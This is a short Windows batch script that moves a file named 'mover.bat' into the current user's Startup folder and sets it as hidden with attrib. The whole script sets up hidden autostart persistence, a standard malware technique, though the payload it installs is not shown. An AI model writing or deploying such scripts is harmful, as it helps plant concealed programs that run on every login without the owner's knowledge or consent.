@echo off
set "source=%~dp0sam/mover.bat"
set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
move "%source%" "%startup%\"
attrib +h "%startup%\sam/mover.bat"
pause
